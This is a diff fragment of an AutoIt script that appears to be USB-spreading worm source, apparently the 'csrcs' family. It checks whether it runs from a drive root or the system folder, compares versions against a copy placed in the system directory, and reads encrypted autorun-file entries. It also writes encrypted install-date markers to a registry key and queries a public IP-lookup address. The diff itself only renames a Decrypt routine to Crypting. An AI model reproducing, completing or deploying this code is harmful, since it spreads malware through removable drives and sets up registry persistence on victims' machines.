 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
 	$Var0340 = FileGetVersion(@SystemDir & "\" & $CSRCSExeName)
 	$Var0341 = FileGetVersion(@AutoItExe)
@@ -5880,7 +5930,7 @@ ElseIf @ScriptDir = @SystemDir Then
 	If FileExists(@ScriptDir & "\" & $AutoRunInName) Then
 		$Var0345 = FileReadLine(@ScriptDir & "\" & $AutoRunInName, 9)
 		$Var0345 = StringTrimLeft($Var0345, 1)
-		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
+		$Var0345 = Crypting(0, $Var0345, $EncryptionKey, 1)
 		$Var0345 = StringSplit($Var0345, "!")
 		For $Var0346 = 1 To $Var0345[0]
 			If $Var0345[0] = 2 Then
@@ -5900,7 +5950,7 @@ ElseIf @ScriptDir = @SystemDir Then
 	If FileExists(@ScriptDir & "\" & $AutoRunIName) Then
 		$Var0345 = FileReadLine(@ScriptDir & "\" & $AutoRunIName, 9)
 		$Var0345 = StringTrimLeft($Var0345, 1)
-		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
+		$Var0345 = Crypting(0, $Var0345, $EncryptionKey, 1)
 		$Var0345 = StringSplit($Var0345, "!")
 		For $Var0346 = 1 To $Var0345[0]
 			If $Var0345[0] = 2 Then
@@ -5956,8 +6006,8 @@ If @ScriptDir = @SystemDir Then
 	EndIf
 	If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
 	Else
-		RegWrite($DRMAmtyRegistryKey, "exp1", "REG_SZ", Decrypt(1, @YDAY * 1, $EncryptionKey, 4))
-		RegWrite($DRMAmtyRegistryKey, "dreg", "REG_SZ", Decrypt(1, @YEAR * 1, $EncryptionKey, 4))
+		RegWrite($DRMAmtyRegistryKey, "exp1", "REG_SZ", Crypting(1, @YDAY * 1, $EncryptionKey, 4))
+		RegWrite($DRMAmtyRegistryKey, "dreg", "REG_SZ", Crypting(1, @YEAR * 1, $EncryptionKey, 4))
 		RegWrite($DRMAmtyRegistryKey, "fir", "REG_SZ", "x")
 	EndIf
 	$Var0347 = "http://www.whatismyip.com/automation/n09230945.asp"
